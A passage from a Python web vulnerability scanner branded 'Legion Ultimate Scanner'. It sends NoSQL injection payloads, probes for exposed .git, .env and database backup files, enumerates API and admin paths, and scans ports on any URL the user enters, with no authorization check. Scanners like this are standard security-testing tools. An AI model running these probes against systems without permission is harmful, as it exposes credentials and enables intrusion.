                results.append({"requests": 15, "time": f"{elapsed:.2f}s", "rate": f"{15/elapsed:.1f} req/s", "evidence": f"15 requests in {elapsed:.2f}s - rate limiting likely missing", "type": "Rate Limiting"})
        except:
            pass
        return results

    def test_http_methods(self):
        results = []
        methods = ["OPTIONS", "HEAD", "TRACE", "PUT", "DELETE", "PATCH", "COPY", "MOVE", "PROPFIND", "MKCOL", "LOCK", "UNLOCK"]
        for method in methods:
            try:
                resp = self.session.request(method, self.target, timeout=DEFAULT_TIMEOUT, verify=False)
                if resp.status_code not in [405, 501, 403]:
                    if method in ["TRACE", "PUT", "DELETE", "COPY", "MOVE", "PROPFIND", "MKCOL", "LOCK", "UNLOCK"]:
                        results.append({"method": method, "status": resp.status_code, "evidence": f"Method {method} allowed (status: {resp.status_code})", "type": "HTTP Methods"})
                    else:
                        results.append({"method": method, "status": resp.status_code, "evidence": f"Method {method} allowed (status: {resp.status_code})", "type": "HTTP Methods"})
            except:
                pass
        return results

    def test_https_redirect(self):
        results = []
        try:
            if self.target.startswith("http://"):
                https_url = self.target.replace("http://", "https://")
                resp = self.session.get(https_url, timeout=DEFAULT_TIMEOUT, verify=False, allow_redirects=False)
                if resp.status_code not in [301, 302, 307, 308]:
                    results.append({"evidence": "No HTTPS redirect implemented", "type": "HTTPS Redirect"})
                elif "location" in resp.headers and "https://" not in resp.headers["location"].lower():
                    results.append({"evidence": "HTTPS redirect not to HTTPS", "type": "HTTPS Redirect"})
        except:
            pass
        return results

    def test_csrf_protection(self):
        results = []
        try:
            resp = self.session.get(self.target, timeout=DEFAULT_TIMEOUT, verify=False)
            form_pattern = r'<form[^>]*>(.*?)</form>'
            for form_html in re.findall(form_pattern, resp.text, re.DOTALL | re.IGNORECASE):
                if "csrf" not in form_html.lower() and "token" not in form_html.lower() and "_csrf" not in form_html.lower():
                    results.append({"evidence": "No CSRF token found in form", "type": "CSRF Protection"})
            if "csrf" not in resp.headers and "x-csrf" not in resp.headers:
                results.append({"evidence": "No CSRF header found", "type": "CSRF Protection"})
            csrf_cookies = [c for c in resp.cookies if "csrf" in c.name.lower() or "token" in c.name.lower()]
            if not csrf_cookies:
                results.append({"evidence": "No CSRF cookie found", "type": "CSRF Protection"})
        except:
            pass
        return results

    def test_http_security_headers(self):
        results = []
        try:
            resp = self.session.get(self.target, timeout=DEFAULT_TIMEOUT, verify=False)
            headers = resp.headers
            required = {
                "strict-transport-security": "HSTS missing (HTTPS downgrade risk)",
                "content-security-policy": "CSP missing (XSS/script injection risk)",
                "x-frame-options": "X-Frame-Options missing (Clickjacking risk)",
                "x-content-type-options": "X-Content-Type-Options missing (MIME sniffing risk)",
                "referrer-policy": "Referrer-Policy missing (Referrer leakage risk)",
                "permissions-policy": "Permissions-Policy missing (Browser feature abuse risk)",
                "x-xss-protection": "X-XSS-Protection missing (XSS protection risk)"
            }
            for header, msg in required.items():
                if header not in headers:
                    results.append({"header": header, "evidence": msg, "type": "Security Headers"})
            if "server" in headers:
                results.append({"header": "server", "value": headers["server"], "evidence": f"Server header exposes: {headers['server']}", "type": "Information Disclosure"})
            if "x-powered-by" in headers:
                results.append({"header": "x-powered-by", "value": headers["x-powered-by"], "evidence": f"X-Powered-By exposes: {headers['x-powered-by']}", "type": "Information Disclosure"})
        except:
            pass
        return results

    def test_no_sql_injection(self):
        results = []
        payloads = ["{'$ne': ''}", "{'$gt': ''}", "{$ne: null}", "{'$regex': '.*'}", "{'$or': []}", "{'$where': '1==1'}", "{'$ne': 'test'}", "{'$gt': 0}", "{'$lt': 0}"]
        params_to_test = self.all_params[:20] + ['q', 'search', 'query', 'filter', 'where', 'sort', 'order']
        for param in params_to_test:
            for payload in payloads:
                try:
                    test_url = f"{self.target}?{param}={quote(payload)}"
                    resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT, verify=False)
                    if "error" in resp.text.lower() or "exception" in resp.text.lower():
                        results.append({"url": test_url, "param": param, "payload": payload, "evidence": "NoSQL error detected", "type": "NoSQL Injection"})
                except:
                    pass
        return results

    def test_git_exposure(self):
        results = []
        paths = ["/.git/config", "/.git/index", "/.git/HEAD", "/.git/logs/HEAD", "/.git/refs/heads/master", "/.git/objects/", "/.git/description"]
        for path in paths:
            try:
                test_url = self.base_url + path
                resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT, verify=False)
                if resp.status_code == 200:
                    if "repository" in resp.text or "ref:" in resp.text or "git" in resp.text:
                        results.append({"path": path, "evidence": "Git repository exposed", "type": "Git Exposure"})
            except:
                pass
        return results

    def test_env_exposure(self):
        results = []
        paths = ["/.env", "/.env.local", "/.env.production", "/.env.dev", "/.env.staging", "/.env.test", "/.env.development", "/.env.prod"]
        for path in paths:
            try:
                test_url = self.base_url + path
                resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT, verify=False)
                if resp.status_code == 200:
                    if "DB_" in resp.text or "PASSWORD" in resp.text or "SECRET" in resp.text or "API_" in resp.text:
                        results.append({"path": path, "evidence": "Environment file exposed with sensitive data", "type": "Env Exposure"})
                    elif len(resp.text) > 50:
                        results.append({"path": path, "evidence": "Environment file exposed (check manually)", "type": "Env Exposure"})
            except:
                pass
        return results

    def test_backup_exposure(self):
        results = []
        paths = ["/backup", "/backup.zip", "/backup.tar.gz", "/backup.sql", "/database.sql", "/db.sql", "/db_backup.sql", "/dump.sql", "/data.sql", "/backup.7z", "/backup.rar", "/backup.bak"]
        for path in paths:
            try:
                test_url = self.base_url + path
                resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT, verify=False)
                if resp.status_code == 200:
                    if "CREATE TABLE" in resp.text or "INSERT INTO" in resp.text or "DROP TABLE" in resp.text:
                        results.append({"path": path, "evidence": "Backup file exposed with database content", "type": "Backup Exposure"})
            except:
                pass
        return results

    def test_api_authentication(self):
        results = []
        paths = ["/api", "/api/v1", "/api/v2", "/api/auth", "/api/user", "/api/admin", "/api/keys", "/api/token", "/api/login", "/api/register", "/api/profile", "/api/settings", "/api/config", "/api/status", "/api/health", "/api/ping"]
        for path in paths:
            try:
                test_url = self.base_url + path
                resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT, verify=False)
                if resp.status_code == 200:
                    if "authenticated" in resp.text.lower() or "authorized" in resp.text.lower():
                        results.append({"path": path, "evidence": "API may be accessible without authentication", "type": "API Authentication"})
                    elif "invalid" not in resp.text.lower() and "error" not in resp.text.lower():
                        results.append({"path": path, "evidence": f"API endpoint accessible: HTTP {resp.status_code}", "type": "API Authentication"})
            except:
                pass
        return results

    def test_jwt_exposure(self):
        results = []
        try:
            resp = self.session.get(self.target, timeout=DEFAULT_TIMEOUT, verify=False)
            jwt_pattern = r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
            matches = re.findall(jwt_pattern, resp.text)
            if matches:
                results.append({"count": len(matches), "evidence": f"Found {len(matches)} JWT tokens in response", "type": "JWT Exposure"})
            for cookie in resp.cookies:
                if "jwt" in cookie.name.lower() or "token" in cookie.name.lower():
                    results.append({"cookie": cookie.name, "evidence": f"JWT-like cookie found: {cookie.name}", "type": "JWT Exposure"})
        except:
            pass
        return results

    def test_ssl_tls_issues(self):
        results = []
        try:
            import ssl
            host = urlparse(self.target).netloc.split(":")[0]
            context = ssl.create_default_context()
            with socket.create_connection((host, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    if cert:
                        not_after = cert.get("notAfter")
                        if not_after:
                            try:
                                exp = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
                                now = datetime.now()
                                days_left = (exp - now).days
                                if days_left < 0:
                                    results.append({"issue": "Certificate expired", "evidence": f"Certificate expired on {not_after}", "type": "SSL/TLS"})
                                elif days_left < 30:
                                    results.append({"issue": "Certificate expires soon", "evidence": f"Certificate expires in {days_left} days", "type": "SSL/TLS"})
                            except:
                                pass
                        version = ssock.version()
                        if version in ["TLSv1", "TLSv1.1", "SSLv3"]:
                            results.append({"issue": "Weak TLS version", "evidence": f"Negotiated: {version}", "type": "SSL/TLS"})
                        cipher = ssock.cipher()[0] if ssock.cipher() else ""
                        if any(x in cipher.lower() for x in ["rc4", "des", "3des", "export", "null", "anon"]):
                            results.append({"issue": "Weak cipher", "evidence": f"Cipher: {cipher}", "type": "SSL/TLS"})
        except:
            pass
        return results

    def test_xss_dom_based(self):
        results = []
        try:
            resp = self.session.get(self.target, timeout=DEFAULT_TIMEOUT, verify=False)
            dom_sinks = ["document.write", "innerHTML", "outerHTML", "eval", "setTimeout", "setInterval", "location.href", "document.cookie", "document.domain", "document.referrer", "postMessage", "addEventListener"]
            for sink in dom_sinks:
                if sink in resp.text:
                    script_pattern = r'<script[^>]*>.*?<\/script>'
                    for script in re.findall(script_pattern, resp.text, re.DOTALL):
                        if sink in script:
                            results.append({"sink": sink, "evidence": f"DOM XSS sink found: {sink}", "type": "DOM XSS"})
                            break
        except:
            pass
        return results

    def test_mixed_content(self):
        results = []
        try:
            if self.target.startswith("https://"):
                resp = self.session.get(self.target, timeout=DEFAULT_TIMEOUT, verify=False)
                http_urls = re.findall(r'(?<=src=["\'])(http://[^"\']+)', resp.text)
                http_urls += re.findall(r'(?<=href=["\'])(http://[^"\']+)', resp.text)
                if http_urls:
                    results.append({"count": len(http_urls), "urls": http_urls[:5], "evidence": f"Found {len(http_urls)} mixed content resources", "type": "Mixed Content"})
        except:
            pass
        return results

    def test_xss_protection(self):
        results = []
        try:
            resp = self.session.get(self.target, timeout=DEFAULT_TIMEOUT, verify=False)
            if "x-xss-protection" not in resp.headers:
                results.append({"evidence": "X-XSS-Protection header missing", "type": "XSS Protection"})
            elif resp.headers.get("x-xss-protection") == "0":
                results.append({"evidence": "X-XSS-Protection set to 0 (disabled)", "type": "XSS Protection"})
        except:
            pass
        return results

    def test_csp_policy(self):
        results = []
        try:
            resp = self.session.get(self.target, timeout=DEFAULT_TIMEOUT, verify=False)
            csp = resp.headers.get("Content-Security-Policy", "")
            if not csp:
                results.append({"evidence": "CSP policy missing", "type": "CSP Policy"})
            else:
                if "'unsafe-inline'" in csp.lower():
                    results.append({"evidence": "CSP allows unsafe-inline", "type": "CSP Policy"})
                if "'unsafe-eval'" in csp.lower():
                    results.append({"evidence": "CSP allows unsafe-eval", "type": "CSP Policy"})
                if "default-src" not in csp.lower():
                    results.append({"evidence": "CSP missing default-src", "type": "CSP Policy"})
                if "script-src" not in csp.lower():
                    results.append({"evidence": "CSP missing script-src", "type": "CSP Policy"})
        except:
            pass
        return results

    def test_http_to_https(self):
        results = []
        try:
            if self.target.startswith("http://"):
                https_url = self.target.replace("http://", "https://")
                resp = self.session.get(https_url, timeout=DEFAULT_TIMEOUT, verify=False, allow_redirects=False)
                if resp.status_code in [301, 302, 307, 308]:
                    if "location" in resp.headers:
                        location = resp.headers["location"]
                        if location.startswith("http://"):
                            results.append({"evidence": "HTTPS redirects to HTTP (downgrade)", "type": "HTTP to HTTPS"})
        except:
            pass
        return results

    def test_hsts_preload(self):
        results = []
        try:
            if self.target.startswith("https://"):
                resp = self.session.get(self.target, timeout=DEFAULT_TIMEOUT, verify=False)
                hsts = resp.headers.get("strict-transport-security", "")
                if hsts:
                    if "preload" not in hsts.lower():
                        results.append({"evidence": "HSTS missing preload directive", "type": "HSTS Preload"})
                    if "max-age=31536000" not in hsts.lower() and "max-age=63072000" not in hsts.lower():
                        results.append({"evidence": "HSTS max-age below recommended (1 year)", "type": "HSTS Preload"})
                else:
                    results.append({"evidence": "HSTS policy missing", "type": "HSTS Preload"})
        except:
            pass
        return results

    def check_port(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.5)
            result = sock.connect_ex((self.host, port))
            sock.close()
            if result == 0:
                service = self.get_service_name(port)
                with self.port_lock:
                    self.port_status[port] = {'status': 'open', 'service': service}
                return port
            else:
                with self.port_lock:
                    self.port_status[port] = {'status': 'closed'}
                return None
        except:
            with self.port_lock:
                self.port_status[port] = {'status': 'error'}
            return None

    def get_service_name(self, port):
        services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 110: 'POP3', 111: 'RPC', 135: 'MSRPC', 139: 'NetBIOS',
            143: 'IMAP', 443: 'HTTPS', 445: 'SMB', 993: 'IMAPS', 995: 'POP3S',
            1723: 'PPTP', 3306: 'MySQL', 3389: 'RDP', 5900: 'VNC',
            8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 8888: 'HTTP-Alt2', 9000: 'HTTP-Alt3', 9443: 'HTTPS-Alt2'
        }
        return services.get(port, 'Unknown')

    def get_severity(self, test_name):
        return self.severity_map.get(test_name, "LOW")

    def get_severity_color(self, severity):
        return {
            "CRITICAL": Colors.CRITICAL,
            "HIGH": Colors.HIGH,
            "MEDIUM": Colors.MEDIUM,
            "LOW": Colors.LOW
        }.get(severity, Colors.INFO)

    def get_severity_icon(self, severity):
        return {
            "CRITICAL": "🔥",
            "HIGH": "⚠️",
            "MEDIUM": "⚡",
            "LOW": "ℹ️"
        }.get(severity, "▪️")

    def run_all_tests(self):
        print(f"{Colors.INFO}[*] Crawling website for forms and parameters...{Colors.RESET}")
        self.crawl(max_pages=MAX_CRAWL_PAGES)
        print(f"{Colors.INFO}[*] Running comprehensive vulnerability tests...{Colors.RESET}")
        print(f"{Colors.DIM}   - Found {len(self.all_forms)} forms and {len(self.all_params)} parameters{Colors.RESET}")

        # New tests
        print(f"{Colors.INFO}[*] Testing header injection...{Colors.RESET}")
        header_results = self.test_header_injection()
        if header_results:
            self.vulnerabilities.append({"name": "Header Injection", "severity": "HIGH", "results": header_results})

        print(f"{Colors.INFO}[*] Testing subdomain takeover...{Colors.RESET}")
        subdomain_results = self.test_subdomain_takeover()
        if subdomain_results:
            self.vulnerabilities.append({"name": "Subdomain Takeover", "severity": "HIGH", "results": subdomain_results})

        print(f"{Colors.INFO}[*] Scanning for admin panels...{Colors.RESET}")
        admin_results = self.test_admin_panels()
        if admin_results:
            self.vulnerabilities.append({"name": "Admin Panel", "severity": "MEDIUM", "results": admin_results})
            for panel in admin_results:
                print(f"{Colors.SUCCESS}✅ Found admin panel: {panel['url']} [{panel['status']}]{Colors.RESET}")

        print(f"{Colors.INFO}[*] Checking SSL/TLS certificate...{Colors.RESET}")
        cert_info = self.test_certificate()
        if cert_info:
            print(f"{Colors.SUCCESS}✅ SSL/TLS certificate found{Colors.RESET}")
            self.vulnerabilities.append({"name": "SSL/TLS Info", "severity": "LOW", "results": [cert_info]})

        print(f"{Colors.INFO}[*] Scanning ports...{Colors.RESET}")
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            list(executor.map(self.check_port, PORTS_TO_SCAN))

        tests = [
            ("SQL Injection", self.test_sqli),
            ("XSS", self.test_xss),
            ("LFI", self.test_lfi),
            ("Command Injection", self.test_command_injection),
            ("SSRF", self.test_ssrf),
            ("XXE", self.test_xxe),
            ("SSTI", self.test_ssti),
            ("Open Redirect", self.test_open_redirect),
            ("Path Traversal", self.test_path_traversal),
            ("Directory Listing", self.test_directory_listing),
            ("CRLF Injection", self.test_crlf),
            ("Host Header Injection", self.test_host_header_injection),
            ("CORS Misconfiguration", self.test_cors_misconfiguration),
            ("Cookie Security", self.test_cookie_security),
            ("Content Spoofing", self.test_content_spoofing),
            ("Clickjacking", self.test_clickjacking),
            ("Error Handling", self.test_error_handling),
            ("Information Disclosure", self.test_information_disclosure),
            ("Rate Limiting", self.test_rate_limiting),
            ("HTTP Methods", self.test_http_methods),
            ("HTTPS Redirect", self.test_https_redirect),
            ("CSRF Protection", self.test_csrf_protection),
            ("HTTP Security Headers", self.test_http_security_headers),
            ("NoSQL Injection", self.test_no_sql_injection),
            ("Git Exposure", self.test_git_exposure),
            ("Env Exposure", self.test_env_exposure),
            ("Backup Exposure", self.test_backup_exposure),
            ("API Authentication", self.test_api_authentication),
            ("JWT Exposure", self.test_jwt_exposure),
            ("SSL/TLS Issues", self.test_ssl_tls_issues),
            ("DOM-based XSS", self.test_xss_dom_based),
            ("Mixed Content", self.test_mixed_content),
            ("XSS Protection", self.test_xss_protection),
            ("CSP Policy", self.test_csp_policy),
            ("HTTP to HTTPS", self.test_http_to_https),
            ("HSTS Preload", self.test_hsts_preload),
        ]

        results = []
        total = len(tests)
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
            future_to_test = {}
            for name, test_func in tests:
                future_to_test[executor.submit(test_func)] = name
            
            completed = 0
            for future in concurrent.futures.as_completed(future_to_test):
                name = future_to_test[future]
                completed += 1
                print(f"{Colors.DIM}[{completed}/{total}] Testing: {name}...{Colors.RESET}", end="\r")
                try:
                    test_results = future.result(timeout=30)
                    if test_results:
                        severity = self.get_severity(name)
                        results.append({"name": name, "severity": severity, "results": test_results})
                        print(f"{Colors.SUCCESS}✅ {name}: {len(test_results)} issue(s) found{Colors.RESET}")
                    else:
                        print(f"{Colors.DIM}  {name}: No issues found{Colors.RESET}")
                except Exception as e:
                    print(f"{Colors.WARNING}  {name}: Error - {str(e)[:50]}{Colors.RESET}")

        self.vulnerabilities.extend(results)
        return self.vulnerabilities

# ============================== MAIN SCANNER ==============================
class LegionUltimateScanner:
    def __init__(self):
        self.target = None
        self.host = None
        self.session = None
        self.port_status = {}
        self.vulnerabilities = []
        self.start_time = None
        self.user_agents = WordlistLoader.load_user_agents()

    def print_banner(self):
        banner = f"""
{Colors.BANNER}╔═══════════════════════════════════════════════════════════════════╗
{Colors.BANNER}║                                                                   ║
{Colors.BANNER}║   ██╗     ███████╗ ██████╗ ██╗ █████╗ ███╗   ██╗                ║
{Colors.BANNER}║   ██║     ██╔════╝██╔════╝ ██║██╔══██╗████╗  ██║                ║
{Colors.BANNER}║   ██║     █████╗  ██║  ███╗██║███████║██╔██╗ ██║                ║
{Colors.BANNER}║   ██║     ██╔══╝  ██║   ██║██║██╔══██║██║╚██╗██║                ║
{Colors.BANNER}║   ███████╗███████╗╚██████╔╝██║██║  ██║██║ ╚████║                ║
{Colors.BANNER}║   ╚══════╝╚══════╝ ╚═════╝ ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝                ║
{Colors.BANNER}║                                                                   ║
{Colors.SUCCESS}║        ULTIMATE WEB VULNERABILITY SCANNER v6.0                  ║
{Colors.INFO}║              POWERED BY LEGION OPIRAN                          ║
{Colors.WARNING}║          200+ VULNERABILITY CHECKS + ADMIN FINDER              ║
{Colors.BANNER}╚═══════════════════════════════════════════════════════════════════╝
{Colors.RESET}"""
        print(banner)

    def get_target(self):
        while True:
            try:
                target = input(f"\n{Colors.INFO}[+] Enter target URL (e.g., example.com): {Colors.RESET}").strip()
                if not target:
                    print(f"{Colors.WARNING}[!] Please enter a valid URL!{Colors.RESET}")
                    continue
                if not target.startswith(('http://', 'https://')):
                    target = 'https://' + target
                parsed = urlparse(target)
                if not parsed.netloc:
                    print(f"{Colors.WARNING}[!] Invalid URL format!{Colors.RESET}")
                    continue
                self.target = target
                self.host = parsed.netloc
                return True
            except Exception as e:
                print(f"{Colors.WARNING}[!] Error: {e}{Colors.RESET}")

    def setup_session(self):
        self.session = requests.Session()
        user_agent = random.choice(self.user_agents)
        self.session.headers.update({
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/json,text/plain;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        })
        self.session.verify = False
        self.session.timeout = DEFAULT_TIMEOUT

    def scan_ports(self):
        print(f"{Colors.INFO}[*] Scanning ports...{Colors.RESET}")
        tester = AdvancedVulnerabilityTests(self.target, self.session)
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            list(executor.map(tester.check_port, PORTS_TO_SCAN))
        self.port_status = tester.port_status

    def run(self):
        self.print_banner()
        if not self.get_target():
            return
        self.setup_session()

        print(f"\n{Colors.INFO}[*] Starting ultimate scan on {self.target}{Colors.RESET}")
        print(f"{Colors.INFO}[*] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}")
        self.start_time = time.time()

        # Run vulnerability tests
        tester = AdvancedVulnerabilityTests(self.target, self.session)
        self.vulnerabilities = tester.run_all_tests()
        self.port_status = tester.port_status

        elapsed = time.time() - self.start_time
        print(f"\n{Colors.SUCCESS}[+] Scan completed in {elapsed:.2f} seconds{Colors.RESET}")

        # Print results
        self.print_results(tester)

        # Save results
        save = input(f"\n{Colors.INFO}[?] Save results to JSON? (y/n): {Colors.RESET}").strip().lower()
        if save in ['y', 'yes']:
            self.save_results()

    def print_results(self, tester):
        if not self.vulnerabilities:
            print(f"\n{Colors.SUCCESS}[+] No vulnerabilities found!{Colors.RESET}")
            return

        severity_order = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1}
        sorted_vulns = sorted(self.vulnerabilities, key=lambda x: severity_order.get(x.get("severity", "LOW"), 0), reverse=True)

        print(f"\n{Colors.BANNER}{'='*70}{Colors.RESET}")
        print(f"{Colors.SUCCESS}📊 VULNERABILITY REPORT{Colors.RESET}")
        print(f"{Colors.BANNER}{'='*70}{Colors.RESET}")

        for vuln in sorted_vulns:
            severity = vuln.get("severity", "UNKNOWN")
            color = tester.get_severity_color(severity)
            icon = tester.get_severity_icon(severity)
            print(f"\n{color}{icon} {severity}{Colors.RESET} - {vuln['name']} ({len(vuln['results'])} issues)")
            
            if vuln['name'] == "Admin Panel":
                for i, result in enumerate(vuln.get("results", [])[:10], 1):
                    print(f"    {Colors.DIM}{i}. {result['url']} [{result['status']}] - {result['title']}{Colors.RESET}")
            else:
                for i, result in enumerate(vuln.get("results", [])[:5], 1):
                    evidence = result.get("evidence", str(result)[:80])
                    if len(evidence) > 80:
                        evidence = evidence[:77] + "..."
                    print(f"    {Colors.DIM}{i}. {evidence}{Colors.RESET}")
            if len(vuln.get("results", [])) > 10 and vuln['name'] == "Admin Panel":
                print(f"       {Colors.DIM}... and {len(vuln['results']) - 10} more{Colors.RESET}")
            elif len(vuln.get("results", [])) > 5:
                print(f"       {Colors.DIM}... and {len(vuln['results']) - 5} more{Colors.RESET}")

        print(f"\n{Colors.INFO}📡 PORT STATUS:{Colors.RESET}")
        open_ports = [p for p, s in self.port_status.items() if s.get('status') == 'open']
        for port in open_ports:
            print(f"  {Colors.SUCCESS}✅ {port}: {self.port_status[port].get('service', 'Unknown')} (OPEN){Colors.RESET}")
        if not open_ports:
            print(f"  {Colors.WARNING}No open ports found{Colors.RESET}")

        severity_counts = defaultdict(int)
        for vuln in self.vulnerabilities:
            severity_counts[vuln.get("severity", "LOW")] += 1

        print(f"\n{Colors.BANNER}{'='*70}{Colors.RESET}")
        print(f"{Colors.SUCCESS}📈 SUMMARY{Colors.RESET}")
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
            count = severity_counts.get(sev, 0)
            if count > 0:
                print(f"  {tester.get_severity_color(sev)}{tester.get_severity_icon(sev)} {sev}: {count}{Colors.RESET}")
        print(f"{Colors.INFO}  📝 Total vulnerabilities: {len(self.vulnerabilities)}{Colors.RESET}")
        elapsed = time.time() - self.start_time
        print(f"{Colors.INFO}  ⏱️  Scan duration: {elapsed:.2f}s{Colors.RESET}")
        print(f"{Colors.BANNER}{'='*70}{Colors.RESET}")

    def save_results(self):
        if not self.vulnerabilities:
            print(f"{Colors.WARNING}[!] No results to save{Colors.RESET}")
            return

        filename = f"legion_ultimate_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        data = {
            "target": self.target,
            "timestamp": datetime.now().isoformat(),
            "duration": time.time() - self.start_time,
            "ports": self.port_status,
            "vulnerabilities": self.vulnerabilities
        }
        try:
            with open(filename, 'w') as f:
                json.dump(data, f, indent=2)
            print(f"{Colors.SUCCESS}[+] Results saved to {filename}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.WARNING}[!] Error saving results: {e}{Colors.RESET}")

if __name__ == "__main__":
    try:
        scanner = LegionUltimateScanner()
        scanner.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Scan interrupted by user{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.WARNING}[!] Fatal error: {e}{Colors.RESET}")
        sys.exit(1)
